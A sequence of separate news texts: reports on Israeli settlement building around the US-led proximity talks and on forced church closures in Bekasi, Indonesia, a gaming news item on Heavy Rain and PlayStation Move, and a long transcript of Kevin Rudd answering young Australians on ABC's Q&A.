It was greeted with dismay by Palestinian officials .
George Mitchell , the US special envoy , has spent months attempting to get Israelis and Palestinians to restart negotiations , and was hoping a new round of indirect " proximity " talks would begin today .
" If the Israeli government wants to sabotage Mitchell 's efforts by taking such steps , let 's talk to Mitchell about maybe not doing this if the price is so high , " Saeb Erekat , the chief Palestinian negotiator , said .
For many months , Palestinian officials resisted any return to negotiations with Israel , saying all settlement construction should first be halted in line with the obligations of the US " road map " of 2003 .
All settlements on occupied territory are illegal under international law .
Finally , under international pressure , the Palestinian president , Mahmoud Abbas , was persuaded to enter a four - month period of shuttle diplomacy , led by Mitchell and due to start in the coming days .
Although the US administration last year demanded Israel halt all settlement building , it eventually welcomed the partial curbs imposed by the Israeli prime minister , Binyamin Netanyahu .
The temporary curbs did not apply to east Jerusalem , public buildings or around 3,000 flats whose construction was already under way .
The Israeli defence ministry said the Beitar Illit flats had been approved under the previous Israeli government and that construction needed to happen now , for unspecified security reasons .
However , Hagit Ofran , of the Israeli group Peace Now , which monitors and opposes settlements , said the construction directly contradicted Netanyahu 's settlement curbs , which prevented building of any flats – even if already approved – on which work had not yet started .
" It is a very unfortunate welcome that the government of Israel is giving to the vice - president , " she said .
" It is as if they want to make it look like they want peace but on the other hand to torpedo the chance for these talks to succeed . "
Last week , another plan for 600 new flats in the east Jerusalem settlement of Pisgat Zeev passed through an initial stage of the approval process .

“ But as an Indonesian and as a follower of Christ , we will still worship , ” said Pieterson Purba , a visiting pastor , in response to news that local authorities planned to seal off their makeshift church and force them to move .
“ And with nowhere else to go , we will continue to worship right here in this house . ”
A week later , on Feb. 28 , an angry mob of fundamentalist Muslims attacked their morning service for the second time , demanding they leave the neighborhood .
“ Where should we go ? ” one member of the congregation asked .
For almost 20 years , this parish , part of the Batak Christian Protestant Church in the Pondok Timur Indah neighborhood of Bekasi , an industrial suburb of Jakarta , has been petitioning the government to build their own place to pray .
But authorities have repeatedly denied them permits , citing national laws that govern the establishment of houses of worship .
It is a scene that has played out with increasing frequency throughout Indonesia .
The Indonesian Community of Churches reported a spike in forced church closings in the last year .
At least 10 churches , the group said , were forced to suspend services due to mob threats and government intervention .
In all those cases , a lack of permits was cited as the reason for the attacks .
Indonesian law requires 60 percent of a community ’s residents to support the building of any religious institution before permits can be issued , an often impossible task for Christians , who make up less than nine percent of the country ’s total population , and other minority religious groups .
Indonesia , although not an Islamic state , is home to the world ’s largest population of Muslims .
The country is a democracy and its constitution nominally protects freedom of religion , as does the state ideology , known as Pancasila .
But several antiquated laws , like those governing the establishment of religious buildings and another that makes blasphemy a criminal offense , appear to contradict the country ’s constitution .
“ These laws are clearly discriminatory toward minority religious groups , ” said Uli Parulian Sihombing , an Indonesian human rights lawyer .
The problem is not limited to Christians .
It has also led to the closure of several mosques in recent years .
On the restive and remote island of Papua , which is predominantly Christian , several half - built mosques have also been forced to close for being unlicensed .
“ The law should be revoked if for no other reason than it is in violation of the country ’s constitution , ” Sihombing said .
The law also encourages violence , rights groups say .
On Feb. 8 , a Sunday , the Pondok Timur Indah congregation clashed with a violent mob .
A crowd of about 200 gathered outside the house during morning services , chanting slogans and demanding its closure .
Police arrived at the scene , dispersed the crowd , and temporarily sealed the home .
“ We had to finish our service in the street , ” said Luspita Simanjuntak , the church ’s pastor for the past three years .
A week later , at another church in Bekasi , members of the Islamic Defender ’s Front , a fundamentalist group most famous for their violent attacks on nightclubs and restaurants that serve alcohol , gathered to force its closure .
In December , a Muslim mob attacked yet another Bekasi church , uprooting trees , smashing lamps and windows .
And in late January , two churches and a pastor ’s home in North Sumatra were set aflame for not having permits .
For some local officials , however , the law makes sense .
Nyaman , the government official in charge of the Pondok Timur Indah neighborhood in Bekasi , said not he , nor anyone in the neighborhood , were anti-Christian .
“ They have the right to practice their religion , ” he said .
“ The problem is the place .
Their congregation is growing and their services cause traffic and disrupt the neighborhood . ”
He said he had politely asked the parish to search for a new area to hold services where there is a greater number of Christians or that is more commercial .
“ We have time and again extended their deadline , but they have yet to find a new place , ” he said .
Unable to garner the necessary support from the community , which is mostly Muslim , the Pondok Indah Timur parish has led a semi-nomadic life , moving from house to house to house to hold their services .
“ The government has forced us to move over and over again , ” said Simanjuntak , who openly cried during a protest demanding protection for churches in Jakarta on Feb.
9 , a day after the mob closed hers .
“ We are just holding services in our homes until we get permission to build a church .
But they never give us permission .
They never even respond to our letters . ”

Update : SCEE ’s sent VG247 its response on the matter , saying it “ ca n’t comment ” on it , further adding it does n’t know “ where it ’s come from but no one has ever confirmed this as far as we ’re aware ” .
Original : Sony ’s apparently confirmed in a Belgian gaming magazine that Heavy Rain will get motion control support via PlayStation Move .
The news was confirmed in the latest issue of Chief , translated by Gamer.nl , which also mentions other titles like LittleBigPlanet getting support , which was confirmed at TGS last year .
No mention of LBP2 , however .
Quantic Dream boss David Cage previously said Heavy Rain supported motion controls , but was then pulled , But he did hint that there would be an announcement on that soon .
Guess this is the announcement .
We ’ll email SCEE and confirm if this is true , or if we ’re just lost in translation .
Thanks , Eurogamer .
TONY JONES : Good evening and welcome to a new season of Q&A and another year of lively and entertaining political debate .
Tonight , something special .
Prime Minister Kevin Rudd joins us at the Museum of Australian Democracy in Old Parliament House .
Please welcome the Prime Minister .
We 're standing in the old House of Representatives chamber , where past leaders , such as Curtin , Menzies , Whitlam and Fraser stood to address the nation and answer questions from the floor .
Tonight the Prime Minister will face questions , without notice , from this audience of 200 young Australians all aged between 16 and 25 .
Now , remember , Q&A is live from 9.35 Eastern Time , so join the Twitter conversation .
Send your questions by SMS to 197 55 222 or go to our website at abc.net.au / qanda .
That 's " qanda " .
Our young audience have outdone themselves with hundreds of great questions .
We wo n't get through all of them , but the Prime Minister has agreed to keep his answers short and concise - that 's true , is n't it - and help us get through as many of them as possible .
KEVIN RUDD :
Thanks .
TONY JONES :
So let 's get cracking with our very first question , which comes from Steven Lee .
STEVEN LEE : Hi .
My question to you is in regard to the 2007 campaign win , which got you the Prime Minister role .
In that campaign you had the slogan " Kevin ' 07 " and I was wondering in the upcoming election if you could give us a sneak preview or some sort of insight into your new slogan .
KEVIN RUDD : Right , thank you for that .
No .
Next question ?
I suppose if we had an election in 2011 , which would cause the eyebrows to go up , it could be Kevin ' 11 , but ...
TONY JONES : I thought about this a bit .
If you campaigned heavily on the stimulus package you could call it " Manna From Kevin " .
KEVIN RUDD : No , we 're still a ways away from an election , so we really have n't given any thought to that , so the key thing is to do what you committed to doing and people will make a judgment .
They 're hard judges but they 're fair .
TONY JONES : Let 's move along quickly , and we 've got another question in the audience .
It 's from Matthew Laing .
MATTHEW LAING : Prime Minister , last week the newspapers ran a series of stories detailing a long list of promises that the ALP made the last election , which remain unfulfilled after more than two years in government .
Given the amount of young people who got behind the Kevin '07 Campaign , on the basis of its reform and change agenda , is it any wonder why idealistic youth become cynical adults when it comes to politics ?
KEVIN RUDD : I think the key thing is to actually go through the list of what we undertook to do .
There is , I think , about 600 or so undertakings we gave to the Australian people before the last election .
I think you 'll find the vast bulk of those have either been implemented or are being implemented .
Look , I 'm not going to stand here and say to you we have n't changed our mind about a number , but it 's a relatively small number overall .
Key thing that we faced in year number one though , in answer to part of your question , was how do you deal with this global economic catastrophe and , frankly , for governments right around the world , this just was a missile coming from the right and the left at the same time .
So you had to deal with the crisis .
What we managed to do at the crisis , however , when so many economies were tumbling over around the world , was inject this national infrastructure stimulus strategy of ours and , guess what : we kept the economy afloat .
We 're the only economy of the major advance economies not to go in recession .
We 're the only economy of the advanced economies to have generated positive economic growth last year .
So your question about the commitments , fair question , fair cop .
I 'm not going to stand here and pretend that we 're purer than the driven snow , we 're not .
But if you go through the whole list , 600 odd , going to things like we said we 'd pull our troops out of Iraq .
We pulled our troops out of Iraq .
We said we 'd ratify Kyoto .
We 've ratified Kyoto .
We said we 'd bring in a carbon pollution reduction scheme - an emissions trading scheme .
Well , we 've tried .
There 's another mob up the road there are preventing that from happening .
Can I say , on so many of the big things that we undertook to do , including an education revolution , it 's rolling out there .
But keeping the economy strong in the midst of that crisis last year and protecting jobs and jobs for young people , frankly , was a huge task and we 're not through it yet .
TONY JONES : Very briefly , Matthew was n't alone on this .
We 've got a lot of questions about unfulfilled or broken promises .
KEVIN RUDD : Yeah .
TONY JONES : Now , I 'm wondering , you talked about problems with communicating .
KEVIN RUDD : Yeah .
TONY JONES : Have you failed to communicate this issue of promises ?
I mean , you saw the daily telegraph .
A huge list of unfulfilled or broken promises they claim .
KEVIN RUDD : Yeah , but as I said , you go back to our entire list of undertakings .
As I said it 's something in excess of 600 , and they cover every field from the economy , through education , through health and the rest , and we 're proud of our record .
On the question of communication , it 's always tough .
You know what it 's like out there .
There 's always a celebration of the things that go wrong , as opposed to the things that go right .
That 's kind of news .
That 's politics .
That 's reality .
That 's what we deal with .
Have we been the perfect communications of a message ?
Of course not , including myself .
But you know something , the record is not a bad one , given what we 've been up against with a global crisis , which has seen unemployment go into double digits in many of the other advanced economies around the world and we in this country have managed to keep unemployment so far at 5.8 per cent .
That has been number one priority for us , because it 's about protecting jobs and supporting working families .
TONY JONES : Let 's go to another question on this .
I note someone 's got their hand up .
We 'll come to you in a minute .
We have another question on this subject .
It 's from Angela Samuels .
ANGELA SAMUELS : Mr Rudd , I 'd like to know how you expect us to trust you - our generation , the ones that got behind you in the Kevin ' 07 - and now you expect us to trust you on everything you 're saying and you broke promises like the laptops ones and the health ones and all the ones that were important to our generation ?
KEVIN RUDD :
Well , let 's go to the two that you 've raised .
Laptops , which is computers in schools , we said we would have a computer for every young person at secondary school from year nine and above by , I seem to recall , 2013 or thereabouts .
We are on track to doing that .
We have about 260,000 computers out there in schools now .
Well , you 're shaking your head .
Can I just say that is a fact , and if you ring up principals from around the country it 's happening .
But our commitment was not to have it done by this year .
It was to be done over a period of time and that has still a couple of years to elapse .
On the second point that you raise about health , as I said today in the parliament here , what 's the record we inherited ?
Well , our predecessors took a billion dollars out of the public hospital system .
In our two years in office , and our predecessors were there for 12 , we 've increased investment in hospitals by 50 per cent .
That is a huge increase .
We 've increased the number of GP places for training .
We 've increased also the number of nurses for training .
On the two examples you raise , that 's not right and on the future on health in hospitals , as I have said before , if the states and territories do not accept the government 's reform plan for the future of health and hospitals , then we will go to the people and seek a mandate to take over overall responsibility for the system .
That 's what we said we 'd do .
That 's what we intend to do and , frankly , the record on both those things is okay .
But I go back to the answer to the person who began the question before .
I 'm not going to stand here before you and claim that we 're purer than driven snow and did not have to change things .
Bear in mind , we have had the worst global economic crisis since the Great Depression and that was last year .
TONY JONES : Okay .
Angela , we 've got to people with their hand up .
One is the questioner .
We 'll take her first and then we 'll come to you .
ANGELA SAMUELS : I just wanted to know , though , you said about the health system .
You said you were going to take it over .
What happened to you taking it over in July last year ?
Now , you 're saying you 're going to take it over in the future .
When is that going to be ?
How can we trust you if you keep giving us different dates ?
KEVIN RUDD :
What we said was that we'd put a reform plan to the states and territories and what we said , if the states and territories did n't agree to that , we would then go to the people and get a mandate to take it over .
We 're not at the next election yet .
That 's due by the end of this year .
That 's what we said to do .
The place where we went last year was to commission an independent commission of inquiry , headed by a medical expert , Dr Christine Bennett , across - guess how many hospitals in this country ?
750 public hospitals in Australia .
If you 're going to do health reform , you 've got to get it right .
You 've got to get it absolutely right .
So many people depend on it on a daily basis .
That 's what we intend to do .
That 's what we 're adhering to .
But I go back to what we 've done in two years alone .
My predecessor ripped a billion dollars out of the public hospital system .
We have increased our funding to the public hospital system by 50 per cent in just two years .
Can I just say , that 's not a bad foundation , but there 's a hang of a lot more to do .
TONY JONES :
All right , we 've got another questioner down the front had his hand up .
AUDIENCE MEMBER : Did n't you say when you were going to reform the health system that the buck would stop with you , yet you 've made two references to the previous government 's decisions , and I note you did n't reference the previous governments surplus they left you in terms of the economic crisis .
But you said the buck would stop with you , so will it or are we going to keep hearing that the previous government did this , the previous government did that ?
KEVIN RUDD :
Well , you know , life just does n't start afresh .
Life - it 's a fair point to ask in terms of take your responsibility to the future , but equally acknowledging where you 've come from in the past .
You know there was n't just a line drawn across reality at the end of 2007 .
You 're dealing with a health system which , for a long period of time , had a whole lot of people in the previous government taking money out of it .
That 's just a reality .
What we undertook to do was to take responsibility for the system and as far as the buck stops with me concern I do n't back away from that one minute , but I go back to what I said in response to the earlier question and that is to make sure that you 've got the detail right , therefore the plan we 're putting for the long term reform of the system we are confident in .
If the states and territories reject it , we will seek from the people a mandate for the Commonwealth , the Australian Government , to take overall responsibility for the system and the buck , therefore , stops with me .
That 's entirely consistent with what I said prior to the election and , frankly , it 's the responsible way to go but you 've got to get it right .
TONY JONES : Okay , this is Q&A , the live and interactive forum , as you can see , where you get to ask the questions and , as you may have noticed , Q&A has moved to half past nine on Monday nights every week .
Our next question comes from Fleur Cribb .
FLEUR CRIBB : Hi , Mr Rudd .
My question is regarding P Plate drivers and increasing road toll .
Given the inconsistent rules across the country , I was just wondering if there is potentially a role for the Federal Government in the next decade to implement a national road rules scheme ?
KEVIN RUDD :
There 's been a lot of discussion between the transport ministers on this very subject .
What we 've tried to do , by the way , at a national government level , is to improve road safety by some other specific regulations , one of which goes to some of the systems used in motor vehicles themselves .
Nationally consistent regulations for the quality control of cars .
That 's just one thing .
We 've also invested in a new way of encouraging young people to learn how to drive in the first place .
I do n't have the numbers on me , but we have .
But on the question of nationally consistent approaches , can I say the transport ministers are pretty seized of how bad it is out there in terms of road safety , young people , but I 've got to say there 's a fair bit of booze involved in this as well , and that 's a real problem .
TONY JONES : Here 's a grim statistic from New South Wales .
A P Plate driver dies in that state every six days .
Sixty - six per cent of deaths amongst 17 to 20 year olds are from car crashes .
A case for a national intervention ?
KEVIN RUDD :
Well , you 've got to get the car safety standards right .
That 's the basic step involved in this , and there have been a few problems with car safety standards around the country .
The second thing is new automatic systems to go into cars to help cars manoeuvre on the road better and more safely .
That 's the second thing we 've done by regulation .
You talk about nationally consistent rules though .
The means we do this through , which is the Australian Transport Ministers ' Council is run by the Australian Government Transport Minister - in this case Anthony Albanese , and the key thing is to get agreement across the states to do it .
Now , I can't tell you here and now how far that 's got and when we 're going to deliver that in terms of a final outcome , but that 's our approach .
I feel about this personally .
My son has just turned 16 .
He 's just got his learners here in Canberra .
I think about this a lot .
I think about it a hell of a lot and , I 've got to say , if there 's practical stuff still to be done we 'll be in there .
TONY JONES : Our questioner has her hand up .
We 'll go back to her .
FLEUR CRIBB : Yeah .
I looked it up to try and have some background research for asking the question and it seems that since 1948 Australia has been trying to implement a national road rule scheme and in the 1990s the National Transport Commission - I think that 's what it 's called .
Yeah , they implemented one , but the states just sort of adapted it to their own rules and so if you get pulled over in New South Wales and you 're an ACT driver , it 's very confusing about what 's going to happen to you .
KEVIN RUDD : I think ...
FLEUR CRIBB : So I was just wondering ...
KEVIN RUDD : I 'm sorry .
FLEUR CRIBB : Yeah .
KEVIN RUDD : Certainly I think the fines regime differs in all the states and there are certain aspects of the rules .
Ever tried to drive in Melbourne recently with that funny turn left , turn right thing ?
I 've never quite understood it but any Melburnians here will get offended .
So there 's some work to be done but getting motor vehicle standards right and the maximal installation of the technologies in new vehicles which help the stable management of cars , particularly in difficult situations , that 's important too .
But there 's still a whole lot of work to be done and I feel personally concerned about this , as any parent of young person would , when you 've got a young fellow out there taking his first driving lessons .
TONY JONES : Okay , you mentioned alcohol and we actually have a question on that subject .
It 's from Linna Wei .
LINNA WEI : Hi , Mr Rudd .
The Australian Medical Association in Queensland has said that 100 lives a year could be saved if we lifted the legal drinking age to 21 , the same as it is in the US .
Teenagers start driving when they 're 18 .
Coincidentally , this is the same age as the legal drinking age in Australia .
Mr Rudd , have you ever considered lifting the minimum legal drinking age in Australia ?
KEVIN RUDD :
We 've had a few discussions about that because , you 're right , in certain places in the United States that 's been considered and embraced .
The key thing is to work out what actually works .
One of the things that we 've had a few problems with , and it wo n't be popular , probably in an audience like this , is the ready accessibility of sweet alcohol intensive drinks , like alcopops .
We took a pretty controversial decision , which is to increase the price of alcopops , which drove a whole lot of young people quite mad , because we 're making it harder to get .
But you know what happened ?
Just in this category of drinks , huge impact in drinking rates of young teenagers going through the roof , because it was sweet , highly alcoholic and hugely affecting their ability to , frankly , manoeuvre a car , if they were at that age as well .
TONY JONES :
But the tax has n't stopped binge drinking .
KEVIN RUDD : ( Indistinct ) but there are a series of practical measures that you can put in place to try and reduce the problem .
You know , you can't wave a magic wand and say , " Tomorrow everyone will drive responsibly .
Tomorrow a whole bunch of people will stop drinking . "
What you can do is put in place some practical things which make it more difficult .
Since we 've taken this measure on alcopops , the consumption of alcopops , I think , has gone down by about 33 per cent .
Then people say , " Oh , they just go and drink other stuff . "
That 's partly true , but the overall alcoholic consumption among young people , I am advised , has gone down by eight per cent ( indistinct ) .
TONY JONES : Right .
Let 's get an answer - a specific answer - to Linna Wei 's question about raising the drinking age - the legal drinking age - to 21 .
Would you consider it ?
KEVIN RUDD : I do n't have the evidence in front of me to say whether we can or whether we can't .
I 'd just rather be straight up with you and say ...
TONY JONES : Would you like to ?
KEVIN RUDD : Of course .
I mean - you mean would I like to ?
TONY JONES : Would you like to raise the drinking age to 21 ?
Of course .
KEVIN RUDD : I believe in something called evidence - based policy , which is if the evidence is there and it's capable of being proven that it works , then we look at these things and make a decision .
But you 're asking me for a personal impression .
You do n't run policy that way , Tony .
TONY JONES : Sometimes .
KEVIN RUDD :
Well , you do n't .
You actually - if you 're doing the serious thing , how many of you are in the category of 18 to 21 here ?
Okay .
How many of you want the drinking age raised to 21 .
Okay .
Well , I 'm just saying there 's got to be a debate about this and it would be an informed debate if we had evidence in front of us which said you do this in State X of the United States and the overall car accident rate and mortality on roads goes down .
But I do n't have that in front of me .
TONY JONES :
So it 's an interesting experiment though , policy by popularity .
That 's - I actually have n't seen that done before .
KEVIN RUDD :
No what I mean is if you 've got some evidence based policy , is it a uniform view in the community , point one .
Point two , is it effective ?
So nice try , mate , but both are relevant .
TONY JONES : No , I just keep remembering that when I first asked the question you said , " Of course , " and then you changed .
Anyway , you 're watching Q&A .
You 're watching Q&A .
KEVIN RUDD : What did I change to ?
TONY JONES : Prime Minister Kevin Rudd is facing 200 young Australians .
The next question comes from Georgia Lourandos .
GEORGIA LOURANDOS : I'm aware that the French Government is currently trying to ban the wearing of the burka in public buildings .
Do you think that it is a core part of western and , indeed , Australian values , that women should show their faces in public , just like men ?
KEVIN RUDD : I do n't , again , have any evidence in front of me which suggests that that helps one way or the other .
People have different cultural and religious traditions and I think broadly they should be accepted .
Why the French Government is doing what it 's doing , a matter for the French .
But from our point of view , we do n't see any reason for such measures to be brought in here .
This is a pretty diverse country that we 've got and , look , there 's always going to be problems at the extremes of any society .
That 's the truth .
But we 've got to be respectful of diversity .
People have different religious traditions .
They come from different ethnic backgrounds .
You 're not going to just enforce some sort of , you know , one size fits all approach to , you know , public behaviour and public dress , otherwise you 're going to have people marching on parade grounds at 6 o'clock in the morning , because the state says so and I do n't believe that 's the right way to go .
TONY JONES : Yes , we 've got hands up in the audience .
We 'll take this one first .
AUDIENCE MEMBER :
Do you believe that the state does have a right to intervene in cases where diversity clashes with repression , as in burkas and oppression of women , as they could be seen ?
KEVIN RUDD :
Well , in the challenge of civil liberties on the one hand and your right to free choice , your right to express yourself in different ways and maintaining security , which is a common concern and a common right of everybody , you know something , there 's no magical solution .
If I were to say to you in terms of people 's right to protest peacefully , as opposed to violently , where and when is that line crossed and when , therefore , do the authorities step in ?
These are often difficult choices .
So I wish there was a magical answer to that .
But I 'm giving you , in response to the earlier question , my overall preference , which is this is a free country .
A lot of the folk who have participated in this parliament over a long period of time have taken big decisions to defend the freedom .
John Curtin , back in the war , deciding to - the measures necessary to defend Australian liberty and democracy , and that was the freedom to choose .
The big debates here in the 50s about whether to ban the Communist Party , and Australians voted that people should have the right to choose what their political persuasion was .
But you know at the end of the day it 's very hard to draw the precise line because if I was standing here today and there had been a terrorist attack yesterday in a part of Australia , and given our security warnings that 's always possible - if you look at the security ratings in this country - then the tonality of this debate would change and people would say , " Well , are we doing everything we could ? "
The balance is hard to get but I 'm saying my instincts are always on the side of preserving the liberty which we spent so many decades centuries here building .
TONY JONES : Do you want to continue your cross-examination ?
AUDIENCE MEMBER : ( Indistinct ) .
TONY JONES : Okay , let 's move onto our next question .
It 's on a very different subject .
It 's from Jeff Shen .
JEFF SHEN : Policies regarding to permanent residence for international students are constantly changing and consequently many of the international students are overloading courses so that future policy changes does n't affect their intentions to stay in Australia .
So could you please explain why international students are being singled out ?
Why can't they be part of Australia 's future or is international students studying here just a revenue raiser ?
KEVIN RUDD : No , it 's not - look , this has been a challenge for governments over a long period of time and will be into the future .
But , you know , there 's a responsibility we have to many governments and many countries who send folk here or have folk come here to study in the first place , which is having obtained a bunch of skills , a lot of those countries actually want them back home from the place where they 've come from .
That 's one thing you 've got to bear in mind in setting your future immigration policy for students studying in Australia .
The second thing is this : we are always going to make hard judgments in this country about what skills we need at a particular time in Australia .
There 's been a debate in the papers today about ...
TONY JONES :
Well , your immigration minister has come out today and listed a new set of rules for what is acceptable in terms of the courses you study to get permanent residency here .
I think that 's partly being alluded to in that question .
KEVIN RUDD : Yes , that 's what I 'm saying is that we will make a hardline judgment each year , on a rolling basis , about the skills that you need for Australia for the future .
TONY JONES :
So there 's no ...
KEVIN RUDD : And that will change .
TONY JONES :
There seemed to be an undercurrent there that perhaps the government thought some international students were rorting the system to get an easy run to Australian residency .
KEVIN RUDD : Well , Australian residency and ultimately Australian citizenship is a privilege , therefore you 've got to be very careful about how you construct your immigration system .
These are hard decisions .
They 're very practical decisions .
But the good thing is , frankly , basically since the war we have been a country which has encouraged people to come here from right across the world , including students , and it may be , to go back to the basis of your question , that having come here , picked up your qualification , the best thing that you decide to do and it may be in the interest of your country to spend a couple of years back home and then apply afresh to come here .
In terms of the skills that are relevant to Australia , that will always be made independently by people looking at where our economy needs people for the next 5 , 10 , 15 , 20 years and that skills profile changes from year to year .
I know that 's a tough message for many folk who , having studied here , want to stay here but I 've got to say it 's a balance message if you 're looking at our long - term immigration policy .
TONY JONES :
All right , we 've got a few hands up in the audience .
Let 's take this young lady in the second row here first .
AUDIENCE MEMBER : Despite the recent changes today made by Chris Evans regarding permanent residency , how can you ensure that Australian citizens such as myself , in their final year , can graduate knowing that there will be a job there for them , because it seems to be changing with your immigration law .
You seem to be softening up than hardening up .
How can you guarantee we will get a job in the Australian job market ?
KEVIN RUDD : You 're an Australian citizen ?
AUDIENCE MEMBER : Yes , I am .
KEVIN RUDD : Okay , fine .
There 's two things to say in response ...
( AUDIENCE LAUGH )
KEVIN RUDD :
Well , no , the question asked by this person over here was on the basis that they were not .
I just wanted to be clear about the basis upon which that question was asked and you 're asking about yourself .
AUDIENCE MEMBER : I was born in Australia .
I was born here .
KEVIN RUDD : Yeah , sure .
AUDIENCE MEMBER :
But my parents are from overseas and they have integrated just as much as other Australians who were born ...
KEVIN RUDD : Absolutely .
AUDIENCE MEMBER :
So I just want a guarantee that when I finish my degree I 'm not going to be working odd jobs just to survive .
I 'd like to be guaranteed a job .
Yeah .
KEVIN RUDD :
That 's why I asked the question back , which was the question of how the employment market in this country is unfolding or whether it was a more fundamental question about immigration policy .
That 's why I was seeking clarification .
On the employment market , I just emphasis a point I made back here to the question asked by this fellow up the back here about pre-election commitments and the reality we had to face in the last 12 months .
Unemployment here - it 's still too high .
It 's 5.8 per cent .
It 's also the second lowest of all the major advanced economies in the world .
With youth unemployment , 16 to 24 year olds , which I think is the age bracket here .
Is that right , Tony ?
The unemployment ...
TONY JONES : 25 year olds , but close .
KEVIN RUDD : Yeah .
The youth unemployment rate in Australia is , I think , about 11.5 .
Youth being defined as that bracket of people .
In the United States and France at the moment , it 's about 20 per cent .
Can I just say what we have done in the last year - not perfect , this is the national infrastructure stimulus strategy - it to try and make a difference - a real difference .
If you look back to the recessions of the early nineties and the early eighties , what happened there , when our unemployment for the whole community was in double digits , you can shell out an entire generation of people without opportunity .
We did n't want that to happen again .
So when people will criticise us , for example , how we went about funding the national infrastructure stimulus strategy by increasing the budget deficit and by temporary borrowings , we did it deliberately with the objective in mind of protecting jobs into the future .
That , for us , has been so fundamental and I 'd really encourage you to compare the unemployment and the employment data of this economy with any other advanced economy in the world .
We 've managed to make it better - not perfect , better - in terms of entering the job market in the year ahead .
TONY JONES : Very briefly I gather you are not going to guarantee all university graduates jobs , which is what you were asked .
KEVIN RUDD : No , I do n't think I was asked for providing a guarantee for everyone to get a job .
That 's never been the case .
It was n't the graduated university either .
TONY JONES : No , of course not .
Okay .
KEVIN RUDD : Nor you .
TONY JONES : Indeed .
We have another question from an international student .
It 's from Om Perkash Butra .
OM PERKASH BUTRA : Yes , Mr Prime Minister , Australian Universities are encouraging international student to study in Australia , where racism is increasing day by day , creating a big problem for international students .
I have been victim myself .
So what are your plans to overcome this issue ?
KEVIN RUDD :
It 's a really good question and it's really topical because of the problems particularly in and around Melbourne .
When I speak ...
TONY JONES : Can I just interrupt you for one moment ?
Because he just said , I think , that he had been a victim himself .
Could we just hear what you 're talking about ?
OM PERKASH BUTRA :
Oh , actually I was on New Parliament House on Australian Day , where teenagers - drunk Australian came in and pushed me and actually asked me - said that curry munchers and some of them misbehaved badly , which I can't explain even so that kind of problems are happening around and this was first of my experience , which probably changed my mind a bit of Australia , as well .
KEVIN RUDD :
How long have you been in Australia , if I can ask that ?
OM PERKASH BUTRA : I think seven months only .
KEVIN RUDD : Okay .
Well , that 's a really awful story and makes me sick .
It really makes me sick that anyone would treat you , as a guest in our country , like that .
It 's wrong .
It should n't happen .
In terms of what we 're doing about it , the work that we are currently - have underway with the Victorian Government is to deal with each of the teaching institutions , where some of the students , for example , from India are coming , and to look at the practical questions concerning transport , work after hours and getting safely from where people are working off to where they are staying and then back to where they are studying .
Remember , in big cities there is , right across the world - there are violence rates .
They 're unacceptable .
They 're not good and they often apply to all people , whatever their ethnic background , but I 'm really concerned that this has happened to you just up the road .
But , at a practical level , your question is , " What are we doing about it ? "
With the Victorian Government and the Victorian teaching authorities now looking at those series of practical recommendations .
We commissioned a guy called Bruce Baird , former member of parliament from actually the conservative side of politics , who is just completing a report to us - completed a report to us on what we do specifically about the concerns which Indian students have .
That 's just ( indistinct ) .
TONY JONES : Very briefly , the police in Melbourne in particular keep saying these attacks or very few of them are actually to do with racism , but you 've heard differently here .
Do you fear there is an undercurrent of racism in this country ?
KEVIN RUDD :
My experience of Australia over many , many years , that it 's a very , very , very tolerant country .
I 'm really concerned when I hear these stories .
My son - in - law is Chinese from Hong Kong .
I hear stories from him from time to time , which make me really worried about what might be going on out there .
But his overall story is that he is completely accepted and part of the Australian family .
But we 've just got to keep a weather eye on any of this stuff every taking hold , because this country , Australia , is an shall be a tolerant country , and we have a combined responsibility - politicians of all sides , community leaders , young people , old people - to keep it that way .
But it 's tough and other countries around the world have failed miserably on this score .
TONY JONES :
All right , we 've got a few hands up .
Let 's go to - there are two of you down there with your hands up .
We 'll hear from both of you , if that 's okay .
Start with the gentleman on the right .
AUDIENCE MEMBER :
With the rate of racist acts going up every single day , would you ever consider , like , teaching in school for , like , societies to , you know , merge , kind of thing ?
Like back in one of my friends is in US , so their school runs a program where they give them diverse knowledge about different cultures , so that they become acceptable .
So would you ever consider that in school level ?
TONY JONES : Okay , just take that onboard and we 'll hear from the other young man sitting beside you .
AUDIENCE MEMBER : Actually , I am from India , as well , and this is my third and a half year in Australia and I 'm proud to say that I have never experience racism myself and this is just a comment to say that you have bad people in every single country , but that does n't mean that the entire country is racist .
So I just want to put that point up to every international student , that Australia is not a racist country at all and I 'm happy to be here and I would love to live over here .
KEVIN RUDD :
It 's actually good and important to hear both these stories .
It really is .
That is the Australia I know and these are the stories I am from time to time hearing .
Both of these are realities .
So to go to your specific question , there is always room in our school curriculum for young people to understand more comprehensively the different cultures of the world .
One of my big passions in life has been the study of foreign languages - Asian languages in particular .
In part because it simply provides young people - people generally - with a vehicle to understand vastly different cultures around the world ; see how realities are seen differently and for me that 's really important .
Whether it 's Chinese , Japanese , Indonesian , Malay .
Whether it 's Hindi , whether it 's Urdu , this is important stuff .
But here is one note of encouragement .
Proportionally there are more Australian kids studying foreign languages in our schools - Asian languages - than you 'll find in any other western country .
This is a good thing but its yield will not be had for a long , long time , because you may not turn out a whole generation of , you know , simultaneous interpreters but I 'll tell you what you will do is cause people to understand reality from someone else 's perspective and that builds respect .
TONY JONES : Before we leave this question , let 's go to someone with another perspective on the same issue , Moses Aduot .
MOSES ADUOT : Prime Minister , thank you .
My question is : the United State of America has invested in its own black African Americans and President Barack Obama is a living example of real inclusion - real , practical reconciliation , real sorry to African Americans .
My question is : why is Australia more than happy to receive President Barack Obama , a black man , when Australia is ashamed of its own black , whether Indigenous or African Australians .
KEVIN RUDD : I think my attitude with that would be a bit different and that is - you know something , here at the beginning of 2008 just up the road when we delivered the national apology to Indigenous Australians , this was one step towards achieving real reconciliation between Indigenous and non-Indigenous Australians .
It 's not perfect but , you know something , until we had crossed that bridge of mutual respect , given the centuries of abuse and exploitation of Indigenous Australians by non-Indigenous Australians , then you could n't get to the next step , which is our policy of trying to close the gap between these two parts of the Australian family .
That 's why we 're dead set serious about this .
I 'll be delivering the second annual report on the closing the gap targets we set for ourselves with the apology .
How do you narrow the gap in terms of infant mortality ?
We 've committed to halving that over time .
How do we narrow the gap in terms of year 12 equivalent achievement between Indigenous and non-Indigenous Australians ?
How do you make sure that employment opportunities are the same ?
These are the basic things .
Closing the life expectancy gap , which is currently obscene .
So engaging in a way which acknowledges huge past errors is the first step .
That 's what the apology was all about , but it counts for nothing unless you do the practical stuff on the ground with the hundreds of thousands of Indigenous Australians whose lives still do n't have the same opportunities as non-Indigenous Australians .
That 's our policy .
It will take a long time to work through .
We 've made a start .
As for African Australians or other residents from other parts of the world who are not Indigenous , I am always disturbed , as I said to our friend from India before , to hear of any stories of racial prejudice .
